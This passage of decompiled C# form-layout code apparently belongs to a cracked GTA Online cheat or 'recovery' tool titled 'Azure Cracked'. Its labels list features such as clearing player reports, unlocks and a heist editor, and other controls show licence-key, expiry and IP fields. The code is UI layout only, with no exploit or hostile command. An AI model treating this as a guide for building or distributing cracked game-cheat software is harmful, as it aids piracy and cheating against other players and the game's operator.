      this.siticoneLabel22.Text = "• Clear Reports - Recovery - General";
      this.siticoneLabel23.BackColor = Color.Transparent;
      this.siticoneLabel23.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel23.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel23.Location = new Point(11, 157);
      this.siticoneLabel23.Margin = new Padding(2);
      this.siticoneLabel23.Name = "siticoneLabel23";
      this.siticoneLabel23.Size = new Size(251, 15);
      this.siticoneLabel23.TabIndex = 141;
      this.siticoneLabel23.Text = "• Change Character Gender - Recovery - General";
      this.siticoneLabel6.BackColor = Color.Transparent;
      this.siticoneLabel6.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel6.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel6.Location = new Point(11, 186);
      this.siticoneLabel6.Margin = new Padding(2);
      this.siticoneLabel6.Name = "siticoneLabel6";
      this.siticoneLabel6.Size = new Size(218, 15);
      this.siticoneLabel6.TabIndex = 145;
      this.siticoneLabel6.Text = "• LS Car Meet Award - Recovery - Unlocks";
      this.siticoneLabel7.BackColor = Color.Transparent;
      this.siticoneLabel7.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel7.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel7.Location = new Point(11, 201);
      this.siticoneLabel7.Margin = new Padding(2);
      this.siticoneLabel7.Name = "siticoneLabel7";
      this.siticoneLabel7.Size = new Size(250, 15);
      this.siticoneLabel7.TabIndex = 144;
      this.siticoneLabel7.Text = "• Arms trafficking missions - Recovery - Unlocks";
      this.siticoneLabel21.BackColor = Color.Transparent;
      this.siticoneLabel21.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel21.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel21.Location = new Point(11, 171);
      this.siticoneLabel21.Margin = new Padding(2);
      this.siticoneLabel21.Name = "siticoneLabel21";
      this.siticoneLabel21.Size = new Size(197, 15);
      this.siticoneLabel21.TabIndex = 143;
      this.siticoneLabel21.Text = "• Unlock Clothes - Recovery - Unlocks";
      this.siticoneLabel1.BackColor = Color.Transparent;
      this.siticoneLabel1.Font = new Font("Segoe UI", 8f, FontStyle.Bold);
      this.siticoneLabel1.ForeColor = SystemColors.ButtonHighlight;
      this.siticoneLabel1.Location = new Point(12, 216);
      this.siticoneLabel1.Margin = new Padding(2);
      this.siticoneLabel1.Name = "siticoneLabel1";
      this.siticoneLabel1.Size = new Size(128, 15);
      this.siticoneLabel1.TabIndex = 146;
      this.siticoneLabel1.Text = "• Heist Editor - Recovery";
      this.AccessibleName = "";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoValidate = AutoValidate.Disable;
      this.BackColor = Color.FromArgb(35, 39, 42);
      this.ClientSize = new Size(717, 380);
      this.Controls.Add((Control) this.button3);
      this.Controls.Add((Control) this.button2);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.pictureBox2);
      this.Controls.Add((Control) this.comboBox1);
      this.Controls.Add((Control) this.pictureBox1);
      this.Controls.Add((Control) this.siticoneLabel12);
      this.Controls.Add((Control) this.siticoneLabel11);
      this.Controls.Add((Control) this.siticoneLabel10);
      this.Controls.Add((Control) this.siticoneLabel9);
      this.Controls.Add((Control) this.lastLogin);
      this.Controls.Add((Control) this.createDate);
      this.Controls.Add((Control) this.ip);
      this.Controls.Add((Control) this.sendmsg);
      this.Controls.Add((Control) this.subscription);
      this.Controls.Add((Control) this.expiry);
      this.Controls.Add((Control) this.key);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.siticoneControlBox2);
      this.Controls.Add((Control) this.siticoneControlBox1);
      this.Controls.Add((Control) this.groupBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Main);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Azure Cracked";
      this.TransparencyKey = Color.Maroon;
      this.Load += new EventHandler(this.Main_Load);
      this.groupBox1.ResumeLayout(false);
      this.groupBox1.PerformLayout();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      ((ISupportInitialize) this.bindingSource1).EndInit();
      ((ISupportInitialize) this.pictureBox2).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
